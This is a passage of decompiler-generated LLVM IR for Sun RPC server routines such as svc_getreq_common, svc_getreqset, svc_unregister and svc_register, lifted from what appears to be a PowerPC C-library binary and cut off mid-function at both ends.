  %v3_1002369c = load i32, i32* %v2_1002369c, align 4
  %v1_100236a0 = load i32, i32* @r31, align 4
  %v4_100236a0 = icmp eq i32 %v3_1002369c, %v1_100236a0
  br i1 %v4_100236a0, label %dec_label_pc_1002369c.dec_label_pc_100236b8_crit_edge, label %dec_label_pc_100236a8

dec_label_pc_100236a8:                            ; preds = %dec_label_pc_10023690, %dec_label_pc_1002369c
  %v1_100236ac = inttoptr i32 %v0_100236a8 to i32*
  %v2_100236ac = load i32, i32* %v1_100236ac, align 4
  store i32 %v2_100236ac, i32* %r3.global-to-local, align 4
  %v3_100236b0 = icmp eq i32 %v2_100236ac, 0
  br i1 %v3_100236b0, label %dec_label_pc_100236b0.dec_label_pc_100236b8_crit_edge, label %dec_label_pc_10023690

dec_label_pc_100236b0.dec_label_pc_100236b8_crit_edge: ; preds = %dec_label_pc_100236a8
  br label %dec_label_pc_100236b8

dec_label_pc_1002369c.dec_label_pc_100236b8_crit_edge: ; preds = %dec_label_pc_1002369c
  br label %dec_label_pc_100236b8

dec_label_pc_100236b8:                            ; preds = %dec_label_pc_1002369c.dec_label_pc_100236b8_crit_edge, %dec_label_pc_100236b0.dec_label_pc_100236b8_crit_edge, %entry
  %v0_100236b8 = phi i32 [ %v0_100236b86, %dec_label_pc_1002369c.dec_label_pc_100236b8_crit_edge ], [ %v0_100236a8, %dec_label_pc_100236b0.dec_label_pc_100236b8_crit_edge ], [ 0, %entry ]
  %v1_100236b8 = load i32, i32* @r30, align 4
  %v2_100236b8 = inttoptr i32 %v1_100236b8 to i32*
  store i32 %v0_100236b8, i32* %v2_100236b8, align 4
  %v0_100236cc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100236cc

; uselistorder directives
  uselistorder i32 %v2_100236ac, { 1, 2, 0 }
  uselistorder i32 %v0_100236a8, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder label %dec_label_pc_100236a8, { 1, 0 }
  uselistorder label %dec_label_pc_10023690, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1304 = alloca i32, align 4
  %stack_var_-1292 = alloca i32, align 4
  %stack_var_-1248 = alloca i32, align 4
  %stack_var_-1272 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268580600, i32* @lr, align 4
  %v0_100236f4 = call i32 @__rpc_thread_variables()
  %v1_100236f8 = add i32 %v0_100236f4, 180
  %v2_100236f8 = inttoptr i32 %v1_100236f8 to i32*
  %v3_100236f8 = load i32, i32* %v2_100236f8, align 4
  %v0_100236fc = load i32, i32* @r29, align 4
  %v1_100236fc = mul i32 %v0_100236fc, 4
  store i32 %v0_100236f4, i32* @r30, align 4
  %v2_10023704 = add i32 %v1_100236fc, %v3_100236f8
  %v3_10023704 = inttoptr i32 %v2_10023704 to i32*
  %v4_10023704 = load i32, i32* %v3_10023704, align 4
  store i32 %v4_10023704, i32* @r29, align 4
  %v3_10023708 = icmp eq i32 %v4_10023704, 0
  br i1 %v3_10023708, label %dec_label_pc_10023880, label %dec_label_pc_10023710.preheader

dec_label_pc_10023710.preheader:                  ; preds = %entry
  %v2_10023714 = ptrtoint i32* %stack_var_-1272 to i32
  %v2_10023748 = ptrtoint i32* %stack_var_-1292 to i32
  %v2_10023828 = ptrtoint i32* %stack_var_-1304 to i32
  br label %dec_label_pc_10023710

dec_label_pc_10023710:                            ; preds = %dec_label_pc_10023878.dec_label_pc_10023710_crit_edge, %dec_label_pc_10023710.preheader
  %v0_10023710 = phi i32 [ %v0_10023710.pre, %dec_label_pc_10023878.dec_label_pc_10023710_crit_edge ], [ %v4_10023704, %dec_label_pc_10023710.preheader ]
  %v1_10023710 = add i32 %v0_10023710, 8
  %v2_10023710 = inttoptr i32 %v1_10023710 to i32*
  %v3_10023710 = load i32, i32* %v2_10023710, align 4
  store i32 %v2_10023714, i32* @r31, align 4
  %v1_10023720 = inttoptr i32 %v3_10023710 to i32*
  %v2_10023720 = load i32, i32* %v1_10023720, align 4
  call void @__pseudo_call(i32 %v2_10023720)
  %v3_1002372c = icmp eq i32 %v0_10023710, 0
  br i1 %v3_1002372c, label %dec_label_pc_10023844, label %dec_label_pc_10023734

dec_label_pc_10023734:                            ; preds = %dec_label_pc_10023710
  %v3_10023738 = load i32, i32* %stack_var_-1248, align 4
  store i32 %v3_10023738, i32* %r10.global-to-local, align 4
  %v3_1002374c = icmp eq i32 %v3_10023738, 0
  %v0_10023758 = load i32, i32* @r29, align 4
  br i1 %v3_1002374c, label %dec_label_pc_10023774, label %dec_label_pc_1002378c

dec_label_pc_10023774:                            ; preds = %dec_label_pc_10023734
  %v3_10023778 = load i32, i32* @global_var_1004eeb8.1300, align 4
  %v2_1002377c = add i32 %v0_10023758, 32
  %v3_1002377c = inttoptr i32 %v2_1002377c to i32*
  store i32 %v3_10023778, i32* %v3_1002377c, align 4
  %v0_10023784 = load i32, i32* %r10.global-to-local, align 4
  %v2_10023784 = add i32 %v0_10023758, 40
  %v3_10023784 = inttoptr i32 %v2_10023784 to i32*
  store i32 %v0_10023784, i32* %v3_10023784, align 4
  br label %dec_label_pc_100237b0

dec_label_pc_1002378c:                            ; preds = %dec_label_pc_10023734
  store i32 268580760, i32* @lr, align 4
  %v3_10023794 = call i32 @_authenticate(i32 %v2_10023828, i32 %v2_10023714, i32 %v2_10023748)
  %v3_10023798 = icmp eq i32 %v3_10023794, 0
  br i1 %v3_10023798, label %dec_label_pc_100237b0, label %dec_label_pc_100237a0

dec_label_pc_100237a0:                            ; preds = %dec_label_pc_1002378c
  %v0_100237a4 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_100237ac.1314 to i32), i32* @lr, align 4
  %v2_100237a8 = call i32 @svcerr_auth(i32 %v0_100237a4)
  br label %dec_label_pc_10023844

dec_label_pc_100237b0:                            ; preds = %dec_label_pc_1002378c, %dec_label_pc_10023774
  %v0_100237b0 = load i32, i32* @r30, align 4
  %v1_100237b0 = add i32 %v0_100237b0, 184
  %v2_100237b0 = inttoptr i32 %v1_100237b0 to i32*
  %v3_100237b0 = load i32, i32* %v2_100237b0, align 4
  %v3_100237b8 = load i32, i32* %stack_var_-1304, align 4
  store i32 %v3_100237b8, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  store i32 %tmp20, i32* @r10, align 4
  %v3_100238083 = icmp eq i32 %v3_100237b0, 0
  br i1 %v3_100238083, label %dec_label_pc_10023810, label %dec_label_pc_100237cc

dec_label_pc_100237cc:                            ; preds = %dec_label_pc_100237b0, %dec_label_pc_10023804
  %v0_1002381015 = phi i32 [ %v0_1002381014, %dec_label_pc_10023804 ], [ 0, %dec_label_pc_100237b0 ]
  %v1_100237e8 = phi i32 [ %v1_100237e813, %dec_label_pc_10023804 ], [ 0, %dec_label_pc_100237b0 ]
  %v0_100237e4 = phi i32 [ %v0_100237e410, %dec_label_pc_10023804 ], [ -1, %dec_label_pc_100237b0 ]
  %v0_10023824 = phi i32 [ %v2_10023804, %dec_label_pc_10023804 ], [ %v3_100237b0, %dec_label_pc_100237b0 ]
  %v1_100237cc = add i32 %v0_10023824, 4
  %v2_100237cc = inttoptr i32 %v1_100237cc to i32*
  %v3_100237cc = load i32, i32* %v2_100237cc, align 4
  %v4_100237d0 = icmp eq i32 %v3_100237cc, %v3_100237b8
  br i1 %v4_100237d0, label %dec_label_pc_100237d8, label %dec_label_pc_10023804

dec_label_pc_100237d8:                            ; preds = %dec_label_pc_100237cc
  %v1_100237d8 = add i32 %v0_10023824, 8
  %v2_100237d8 = inttoptr i32 %v1_100237d8 to i32*
  %v3_100237d8 = load i32, i32* %v2_100237d8, align 4
  %v4_100237e0 = icmp eq i32 %v3_100237d8, %tmp20
  %v3_100237e8 = icmp ugt i32 %v3_100237d8, %v1_100237e8
  br i1 %v4_100237e0, label %dec_label_pc_10023824, label %dec_label_pc_100237f0

dec_label_pc_100237f0:                            ; preds = %dec_label_pc_100237d8
  %v3_100237e4 = icmp ugt i32 %v0_100237e4, %v3_100237d8
  br i1 %v3_100237e4, label %dec_label_pc_100237f4, label %dec_label_pc_100237f8

dec_label_pc_100237f4:                            ; preds = %dec_label_pc_100237f0
  br label %dec_label_pc_100237f8

dec_label_pc_100237f8:                            ; preds = %dec_label_pc_100237f0, %dec_label_pc_100237f4
  %v0_100237e411 = phi i32 [ %v0_100237e4, %dec_label_pc_100237f0 ], [ %v3_100237d8, %dec_label_pc_100237f4 ]
  br i1 %v3_100237e8, label %dec_label_pc_100237fc, label %dec_label_pc_10023804

dec_label_pc_100237fc:                            ; preds = %dec_label_pc_100237f8
  store i32 %v3_100237d8, i32* @r5, align 4
  br label %dec_label_pc_10023804

dec_label_pc_10023804:                            ; preds = %dec_label_pc_100237f8, %dec_label_pc_100237cc, %dec_label_pc_100237fc
  %v0_1002381014 = phi i32 [ %v0_1002381015, %dec_label_pc_100237cc ], [ 1, %dec_label_pc_100237f8 ], [ 1, %dec_label_pc_100237fc ]
  %v1_100237e813 = phi i32 [ %v1_100237e8, %dec_label_pc_100237cc ], [ %v1_100237e8, %dec_label_pc_100237f8 ], [ %v3_100237d8, %dec_label_pc_100237fc ]
  %v0_100237e410 = phi i32 [ %v0_100237e4, %dec_label_pc_100237cc ], [ %v0_100237e411, %dec_label_pc_100237f8 ], [ %v0_100237e411, %dec_label_pc_100237fc ]
  %v1_10023804 = inttoptr i32 %v0_10023824 to i32*
  %v2_10023804 = load i32, i32* %v1_10023804, align 4
  %v3_10023808 = icmp eq i32 %v2_10023804, 0
  br i1 %v3_10023808, label %dec_label_pc_10023808.dec_label_pc_10023810_crit_edge, label %dec_label_pc_100237cc

dec_label_pc_10023808.dec_label_pc_10023810_crit_edge: ; preds = %dec_label_pc_10023804
  br label %dec_label_pc_10023810

dec_label_pc_10023810:                            ; preds = %dec_label_pc_10023808.dec_label_pc_10023810_crit_edge, %dec_label_pc_100237b0
  %v0_10023810 = phi i32 [ %v0_1002381014, %dec_label_pc_10023808.dec_label_pc_10023810_crit_edge ], [ 0, %dec_label_pc_100237b0 ]
  %v3_10023810 = icmp eq i32 %v0_10023810, 0
  %v0_1002383c = load i32, i32* @r29, align 4
  br i1 %v3_10023810, label %dec_label_pc_1002383c, label %dec_label_pc_10023818

dec_label_pc_10023818:                            ; preds = %dec_label_pc_10023810
  store i32 ptrtoint (i32* @global_var_10023820.1315 to i32), i32* @lr, align 4
  %v1_1002381c = call i32 @svcerr_progvers(i32 %v0_1002383c)
  br label %dec_label_pc_10023844

dec_label_pc_10023824:                            ; preds = %dec_label_pc_100237d8
  %v1_10023824 = add i32 %v0_10023824, 12
  %v2_10023824 = inttoptr i32 %v1_10023824 to i32*
  %v3_10023824 = load i32, i32* %v2_10023824, align 4
  call void @__pseudo_call(i32 %v3_10023824)
  br label %dec_label_pc_10023844

dec_label_pc_1002383c:                            ; preds = %dec_label_pc_10023810
  store i32 268580932, i32* @lr, align 4
  %v1_10023840 = call i32 @__GI_svcerr_noprog(i32 %v0_1002383c)
  br label %dec_label_pc_10023844

dec_label_pc_10023844:                            ; preds = %dec_label_pc_10023710, %dec_label_pc_10023824, %dec_label_pc_10023818, %dec_label_pc_100237a0, %dec_label_pc_1002383c
  %v0_10023844 = load i32, i32* @r29, align 4
  %v1_10023844 = add i32 %v0_10023844, 8
  %v2_10023844 = inttoptr i32 %v1_10023844 to i32*
  %v3_10023844 = load i32, i32* %v2_10023844, align 4
  %v1_1002384c = add i32 %v3_10023844, 4
  %v2_1002384c = inttoptr i32 %v1_1002384c to i32*
  %v3_1002384c = load i32, i32* %v2_1002384c, align 4
  call void @__pseudo_call(i32 %v3_1002384c)
  %v3_10023858 = icmp eq i32 %v0_10023844, 0
  br i1 %v3_10023858, label %dec_label_pc_10023860, label %dec_label_pc_10023878

dec_label_pc_10023860:                            ; preds = %dec_label_pc_10023844
  %v0_10023860 = load i32, i32* @r29, align 4
  %v1_10023860 = add i32 %v0_10023860, 8
  %v2_10023860 = inttoptr i32 %v1_10023860 to i32*
  %v3_10023860 = load i32, i32* %v2_10023860, align 4
  %v1_10023868 = add i32 %v3_10023860, 20
  %v2_10023868 = inttoptr i32 %v1_10023868 to i32*
  %v3_10023868 = load i32, i32* %v2_10023868, align 4
  call void @__pseudo_call(i32 %v3_10023868)
  br label %dec_label_pc_10023880

dec_label_pc_10023878:                            ; preds = %dec_label_pc_10023844
  %v3_10023878 = icmp eq i32 %v0_10023844, 1
  br i1 %v3_10023878, label %dec_label_pc_10023878.dec_label_pc_10023710_crit_edge, label %dec_label_pc_10023880

dec_label_pc_10023878.dec_label_pc_10023710_crit_edge: ; preds = %dec_label_pc_10023878
  %v0_10023710.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10023710

dec_label_pc_10023880:                            ; preds = %dec_label_pc_10023878, %entry, %dec_label_pc_10023860
  %v0_10023890 = phi i32 [ %v0_100236f4, %entry ], [ %v0_10023860, %dec_label_pc_10023860 ], [ %v0_10023844, %dec_label_pc_10023878 ]
  ret i32 %v0_10023890

; uselistorder directives
  uselistorder i32 %v0_10023844, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1002383c, { 1, 0 }
  uselistorder i32 %v2_10023804, { 1, 0 }
  uselistorder i32 %v3_100237d8, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v0_100237e4, { 2, 1, 0 }
  uselistorder i32 %v1_100237e8, { 1, 2, 0 }
  uselistorder i32 %v0_10023758, { 1, 0 }
  uselistorder label %dec_label_pc_10023880, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10023844, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10023804, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100237f8, { 1, 0 }
  uselistorder label %dec_label_pc_100237cc, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r29, align 4
  store i32 268581036, i32* @lr, align 4
  %v0_100238a8 = call i32 @_rpc_dtablesize()
  store i32 %v0_100238a8, i32* @r27, align 4
  store i32 0, i32* @r28, align 4
  %v2_100238f43 = icmp sgt i32 %v0_100238a8, 0
  br i1 %v2_100238f43, label %dec_label_pc_100238b8.lr.ph, label %dec_label_pc_100238fc

dec_label_pc_100238b8.lr.ph:                      ; preds = %entry
  %v0_100238b8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100238b8

dec_label_pc_100238b8:                            ; preds = %dec_label_pc_100238b8.lr.ph, %dec_label_pc_100238ec
  %v0_100238b8 = phi i32 [ %v0_100238b8.pre, %dec_label_pc_100238b8.lr.ph ], [ %v1_100238ec, %dec_label_pc_100238ec ]
  %v1_100238b8 = inttoptr i32 %v0_100238b8 to i32*
  %v2_100238b8 = load i32, i32* %v1_100238b8, align 4
  store i32 %v2_100238b8, i32* @r31, align 4
  %v1_100238d811 = call i32 @ffs(i32 %v2_100238b8)
  %v3_100238dc12 = icmp eq i32 %v1_100238d811, 0
  %v0_100238e013 = load i32, i32* @r28, align 4
  %v2_100238e014 = add i32 %v1_100238d811, -1
  %v1_100238e415 = add i32 %v2_100238e014, %v0_100238e013
  br i1 %v3_100238dc12, label %dec_label_pc_100238ec, label %dec_label_pc_100238c0

dec_label_pc_100238c0:                            ; preds = %dec_label_pc_100238b8, %dec_label_pc_100238c0
  %v1_100238e416 = phi i32 [ %v1_100238e4, %dec_label_pc_100238c0 ], [ %v1_100238e415, %dec_label_pc_100238b8 ]
  store i32 268581060, i32* @lr, align 4
  %v1_100238c0 = call i32 @svc_getreq_common(i32 %v1_100238e416)
  %v0_100238c4 = load i32, i32* @r30, align 4
  %v1_100238c4 = add i32 %v0_100238c4, -1
  %v2_100238cc = urem i32 %v1_100238c4, 64
  %v3_100238cc = shl i32 1, %v2_100238cc
  %v0_100238d0 = load i32, i32* @r31, align 4
  %v2_100238d0 = xor i32 %v3_100238cc, %v0_100238d0
  store i32 %v2_100238d0, i32* @r31, align 4
  %v1_100238d8 = call i32 @ffs(i32 %v2_100238d0)
  %v3_100238dc = icmp eq i32 %v1_100238d8, 0
  %v0_100238e0 = load i32, i32* @r28, align 4
  %v2_100238e0 = add i32 %v1_100238d8, -1
  %v1_100238e4 = add i32 %v2_100238e0, %v0_100238e0
  br i1 %v3_100238dc, label %dec_label_pc_100238ec, label %dec_label_pc_100238c0

dec_label_pc_100238ec:                            ; preds = %dec_label_pc_100238c0, %dec_label_pc_100238b8
  %v0_100238e0.lcssa = phi i32 [ %v0_100238e013, %dec_label_pc_100238b8 ], [ %v0_100238e0, %dec_label_pc_100238c0 ]
  %v1_100238e4.lcssa = phi i32 [ %v1_100238e415, %dec_label_pc_100238b8 ], [ %v1_100238e4, %dec_label_pc_100238c0 ]
  %v0_100238ec = load i32, i32* @r29, align 4
  %v1_100238ec = add i32 %v0_100238ec, 4
  store i32 %v1_100238ec, i32* @r29, align 4
  %v1_100238f0 = add i32 %v0_100238e0.lcssa, 32
  store i32 %v1_100238f0, i32* @r28, align 4
  %v1_100238f4 = load i32, i32* @r27, align 4
  %v2_100238f4 = icmp slt i32 %v1_100238f0, %v1_100238f4
  br i1 %v2_100238f4, label %dec_label_pc_100238b8, label %dec_label_pc_100238fc

dec_label_pc_100238fc:                            ; preds = %dec_label_pc_100238ec, %entry
  %v0_1002390c = phi i32 [ %v0_100238a8, %entry ], [ %v1_100238e4.lcssa, %dec_label_pc_100238ec ]
  ret i32 %v0_1002390c

; uselistorder directives
  uselistorder i32 %v1_100238f0, { 1, 0 }
  uselistorder i32 %v1_100238ec, { 1, 0 }
  uselistorder i32 %v2_100238d0, { 1, 0 }
  uselistorder i32 (i32)* @ffs, { 1, 0 }
  uselistorder label %dec_label_pc_100238c0, { 1, 0 }
  uselistorder label %dec_label_pc_100238b8, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r10, align 4
  %v2_10023930 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_10023930, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-136, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge

dec_label_pc_10023938.dec_label_pc_10023938_crit_edge: ; preds = %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.dec_label_pc_10023938.dec_label_pc_10023938_crit_edge_crit_edge, %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.lr.ph
  %v1_10023938.pre = phi i32 [ %v2_10023930, %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.lr.ph ], [ %v1_10023938.pre.pre, %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.dec_label_pc_10023938.dec_label_pc_10023938_crit_edge_crit_edge ]
  %v0_10023938.pre = phi i32 [ 0, %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.lr.ph ], [ %v0_10023938.pre.pre, %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.dec_label_pc_10023938.dec_label_pc_10023938_crit_edge_crit_edge ]
  %v1_1002393c22 = phi i32 [ 4, %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.lr.ph ], [ %v1_1002393c, %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.dec_label_pc_10023938.dec_label_pc_10023938_crit_edge_crit_edge ]
  %v3_10023938 = add i32 %v1_10023938.pre, %v1_1002393c22
  %v4_10023938 = inttoptr i32 %v3_10023938 to i32*
  store i32 %v0_10023938.pre, i32* %v4_10023938, align 4
  %v0_1002393c = load i32, i32* %r9.global-to-local, align 4
  %v1_10023940 = add i32 %v0_1002393c, 1
  store i32 %v1_10023940, i32* %r9.global-to-local, align 4
  %v0_10023944 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10023944 = add i32 %v0_10023944, -1
  store i32 %v1_10023944, i32* %ctr.global-to-local, align 4
  %v2_10023944 = icmp eq i32 %v1_10023944, 0
  br i1 %v2_10023944, label %dec_label_pc_10023948, label %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.dec_label_pc_10023938.dec_label_pc_10023938_crit_edge_crit_edge

dec_label_pc_10023938.dec_label_pc_10023938_crit_edge.dec_label_pc_10023938.dec_label_pc_10023938_crit_edge_crit_edge: ; preds = %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge
  %v1_1002393c = mul i32 %v0_1002393c, 4
  %v0_10023938.pre.pre = load i32, i32* @r10, align 4
  %v1_10023938.pre.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge

dec_label_pc_10023948:                            ; preds = %dec_label_pc_10023938.dec_label_pc_10023938_crit_edge
  %phitmp23 = inttoptr i32 %v1_10023940 to i32*
  %v0_10023948.pre.pre = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10023948.pre.pre, i32* %stack_var_-136, align 4
  store i32 268581200, i32* @lr, align 4
  %v2_1002394c = call i32 @svc_getreqset(i32* %phitmp23)
  store i32 %v2_1002394c, i32* %r3.global-to-local, align 4
  ret i32 %v2_1002394c

; uselistorder directives
  uselistorder i32 %v1_10023944, { 1, 0 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_10023968 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10023968, i32* @r5, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268581248, i32* @lr, align 4
  %v1_1002397c = call i32 @svc_find(i32 %v2_10023968)
  store i32 %v1_1002397c, i32* @r31, align 4
  %v3_10023980 = icmp eq i32 %v1_1002397c, 0
  br i1 %v3_10023980, label %dec_label_pc_100239c4, label %dec_label_pc_10023988

dec_label_pc_10023988:                            ; preds = %entry
  %v3_10023988 = load i32, i32* %stack_var_-40, align 4
  %v1_1002398c = inttoptr i32 %v1_1002397c to i32*
  %v2_1002398c = load i32, i32* %v1_1002398c, align 4
  store i32 %v2_1002398c, i32* @r30, align 4
  %v3_10023990 = icmp eq i32 %v3_10023988, 0
  br i1 %v3_10023990, label %dec_label_pc_10023998, label %dec_label_pc_100239a4

dec_label_pc_10023998:                            ; preds = %dec_label_pc_10023988
  store i32 268581276, i32* @lr, align 4
  %v0_10023998 = call i32 @__rpc_thread_variables()
  %v0_1002399c = load i32, i32* @r30, align 4
  %v2_1002399c = add i32 %v0_10023998, 184
  %v3_1002399c = inttoptr i32 %v2_1002399c to i32*
  store i32 %v0_1002399c, i32* %v3_1002399c, align 4
  br label %dec_label_pc_100239a8

dec_label_pc_100239a4:                            ; preds = %dec_label_pc_10023988
  %v2_100239a4 = inttoptr i32 %v3_10023988 to i32*
  store i32 %v2_1002398c, i32* %v2_100239a4, align 4
  br label %dec_label_pc_100239a8

dec_label_pc_100239a8:                            ; preds = %dec_label_pc_10023998, %dec_label_pc_100239a4
  %v0_100239ac = load i32, i32* @r31, align 4
  store i32 %v0_100239ac, i32* @r3, align 4
  %v2_100239b0 = inttoptr i32 %v0_100239ac to i32*
  store i32 0, i32* %v2_100239b0, align 4
  store i32 268581304, i32* @lr, align 4
  %v0_100239b4 = call i32 @free()
  %v0_100239b8 = load i32, i32* @r29, align 4
  %v0_100239bc = load i32, i32* @r28, align 4
  store i32 268581316, i32* @lr, align 4
  %v2_100239c0 = call i32 @__GI_pmap_unset(i32 %v0_100239b8, i32 %v0_100239bc)
  br label %dec_label_pc_100239c4

dec_label_pc_100239c4:                            ; preds = %entry, %dec_label_pc_100239a8
  %v0_100239d4 = phi i32 [ 0, %entry ], [ %v2_100239c0, %dec_label_pc_100239a8 ]
  ret i32 %v0_100239d4

; uselistorder directives
  uselistorder label %dec_label_pc_100239c4, { 1, 0 }
  uselistorder label %dec_label_pc_100239a8, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268581368, i32* @lr, align 4
  %v0_100239f41 = call i32 @__rpc_thread_variables()
  %v1_100239f82 = add i32 %v0_100239f41, 184
  %v2_100239f83 = inttoptr i32 %v1_100239f82 to i32*
  %v3_100239f84 = load i32, i32* %v2_100239f83, align 4
  %v3_100239fc7 = icmp eq i32 %v3_100239f84, 0
  br i1 %v3_100239fc7, label %dec_label_pc_10023a04, label %dec_label_pc_100239e8

dec_label_pc_100239e8:                            ; preds = %entry, %dec_label_pc_100239e8
  %v3_100239f88 = phi i32 [ %v3_100239f8, %dec_label_pc_100239e8 ], [ %v3_100239f84, %entry ]
  %v1_100239e8 = add i32 %v3_100239f88, 8
  %v2_100239e8 = inttoptr i32 %v1_100239e8 to i32*
  %v3_100239e8 = load i32, i32* %v2_100239e8, align 4
  %v1_100239ec = add i32 %v3_100239f88, 4
  %v2_100239ec = inttoptr i32 %v1_100239ec to i32*
  %v3_100239ec = load i32, i32* %v2_100239ec, align 4
  store i32 268581364, i32* @lr, align 4
  %v3_100239f0 = call i32 @svc_unregister(i32 %v3_100239ec, i32 %v3_100239e8, i32 %v3_100239f88)
  store i32 268581368, i32* @lr, align 4
  %v0_100239f4 = call i32 @__rpc_thread_variables()
  %v1_100239f8 = add i32 %v0_100239f4, 184
  %v2_100239f8 = inttoptr i32 %v1_100239f8 to i32*
  %v3_100239f8 = load i32, i32* %v2_100239f8, align 4
  %v3_100239fc = icmp eq i32 %v3_100239f8, 0
  br i1 %v3_100239fc, label %dec_label_pc_10023a04, label %dec_label_pc_100239e8

dec_label_pc_10023a04:                            ; preds = %dec_label_pc_100239e8, %entry
  %v0_100239f4.lcssa = phi i32 [ %v0_100239f41, %entry ], [ %v0_100239f4, %dec_label_pc_100239e8 ]
  ret i32 %v0_100239f4.lcssa

; uselistorder directives
  uselistorder i32 %v3_100239f8, { 1, 0 }
  uselistorder i32 %v3_100239f88, { 2, 0, 1 }
  uselistorder i32 268581368, { 1, 0 }
  uselistorder label %dec_label_pc_100239e8, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r26, align 4
  %v2_10023a30 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10023a30, i32* @r5, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  store i32 268581448, i32* @lr, align 4
  %v3_10023a44 = call i32 @svc_find(i32 %arg2)
  %v3_10023a48 = icmp eq i32 %v3_10023a44, 0
  store i32 16, i32* @r3, align 4
  br i1 %v3_10023a48, label %dec_label_pc_10023a64, label %dec_label_pc_10023a54

dec_label_pc_10023a54:                            ; preds = %entry
  %v1_10023a54 = add i32 %v3_10023a44, 12
  %v2_10023a54 = inttoptr i32 %v1_10023a54 to i32*
  %v3_10023a54 = load i32, i32* %v2_10023a54, align 4
  %v1_10023a58 = load i32, i32* @r28, align 4
  %v4_10023a58 = icmp eq i32 %v3_10023a54, %v1_10023a58
  br i1 %v4_10023a58, label %dec_label_pc_10023a8c, label %dec_label_pc_10023ab4

dec_label_pc_10023a64:                            ; preds = %entry
  store i32 268581480, i32* @lr, align 4
  %v0_10023a64 = call i32 @malloc()
  store i32 %v0_10023a64, i32* @r31, align 4
  %v3_10023a68 = icmp eq i32 %v0_10023a64, 0
  br i1 %v3_10023a68, label %dec_label_pc_10023ab4, label %dec_label_pc_10023a70

dec_label_pc_10023a70:                            ; preds = %dec_label_pc_10023a64
  %v0_10023a70 = load i32, i32* @r28, align 4
  %v2_10023a70 = add i32 %v0_10023a64, 12
  %v3_10023a70 = inttoptr i32 %v2_10023a70 to i32*
  store i32 %v0_10023a70, i32* %v3_10023a70, align 4
  %v0_10023a74 = load i32, i32* @r30, align 4
  %v1_10023a74 = load i32, i32* @r31, align 4
  %v2_10023a74 = add i32 %v1_10023a74, 4
  %v3_10023a74 = inttoptr i32 %v2_10023a74 to i32*
  store i32 %v0_10023a74, i32* %v3_10023a74, align 4
  %v0_10023a78 = load i32, i32* @r29, align 4
  %v1_10023a78 = load i32, i32* @r31, align 4
  %v2_10023a78 = add i32 %v1_10023a78, 8
  %v3_10023a78 = inttoptr i32 %v2_10023a78 to i32*
  store i32 %v0_10023a78, i32* %v3_10023a78, align 4
  store i32 268581504, i32* @lr, align 4
  %v0_10023a7c = call i32 @__rpc_thread_variables()
  %v1_10023a80 = add i32 %v0_10023a7c, 184
  %v2_10023a80 = inttoptr i32 %v1_10023a80 to i32*
  %v3_10023a80 = load i32, i32* %v2_10023a80, align 4
  %v1_10023a84 = load i32, i32* @r31, align 4
  %v2_10023a84 = inttoptr i32 %v1_10023a84 to i32*
  store i32 %v3_10023a80, i32* %v2_10023a84, align 4
  %v0_10023a88 = load i32, i32* @r31, align 4
  store i32 %v0_10023a88, i32* %v2_10023a80, align 4
  br label %dec_label_pc_10023a8c

